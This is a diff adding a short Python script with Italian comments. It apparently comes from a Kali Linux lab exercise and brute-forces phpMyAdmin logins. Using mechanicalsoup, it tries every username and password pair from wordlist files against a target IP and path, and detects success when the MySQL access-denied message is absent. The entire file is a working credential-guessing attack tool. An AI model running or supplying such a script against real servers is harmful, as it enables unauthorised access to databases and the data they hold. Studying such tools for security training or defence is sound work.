@@ -1,0 +1,131 @@
+import mechanicalsoup
+
+import time
+
+import requests
+
+
+
+# IP E PATH
+
+ip = input('Inserire IP target: ')
+
+path = input("Inserire un path: ")
+
+
+
+# USERNAME E PASSWORD FILE
+
+username_file = input('Inserire il percorso del file contenente gli username (premere invio per utilizzare il file di default): ')
+
+if not username_file:
+
+    username_file = '/home/kali/Desktop/user.txt'
+
+
+
+password_file = input('Inserire il percorso del file contenente le password (premere invio per utilizzare il file di default): ')
+
+if not password_file:
+
+    password_file = '/home/kali/Desktop/pass.txt'
+
+
+
+#FUNZIONE BRUTE FORCE
+
+def brute_force_phpMyAdmin():
+
+    start = time.time()
+
+
+
+    with open(username_file) as f:
+
+        usernames = f.read().splitlines()      #APRE IL FILE E NE LEGGE OGNI LINEA
+
+
+
+    with open(password_file) as f:
+
+        passwords = f.read().splitlines()
+
+        
+
+    attempts = 0   #INIZIA A CONTARE I TENTATIVI PARTENDO DA 0
+
+    
+
+    print("\nBrute force in corso con le seguenti coppie di user - password: \n")
+
+
+
+    for user in usernames:
+
+        for password in passwords:
+
+            
+
+            print(f"'{user}' - '{password}'")
+
+            attempts += 1     #INCREMENTA DI 1 IL VALORE DI TENTATIVI PRECEDENTI
+
+            
+
+            browser = mechanicalsoup.StatefulBrowser()
+
+            browser.open(f"http://{ip}/{path}")
+
+            url = browser.get_url()
+
+            
+
+            # POST FORM
+
+            browser.select_form('form[action="index.php"]')
+
+            data = {
+
+            "pma_username": user,
+
+            "pma_password": password,
+
+            }
+
+
+
+            response = browser.session.post(url, data=data)
+
+
+
+            # CONTROLLO SULLA RISPOSTA
+
+            if not f"#1045 - Access denied for user '{user}'@'localhost'" in response.text:
+
+                print("\nAccesso riuscito!\n")
+
+                print(f"Username: '{user}'")
+
+                print(f"Password: '{password}'")
+
+                
+
+                end = time.time()
+
+                print(f'\nNumero di tentativi prima di trovare user e password:  {attempts}')
+
+                print(f"- Tempo impiegato: {end-start:.2f} secondi")
+
+                return
+
+                
+
+            else:
+
+                browser.close()
+
+
+
+
+
+brute_force_phpMyAdmin()
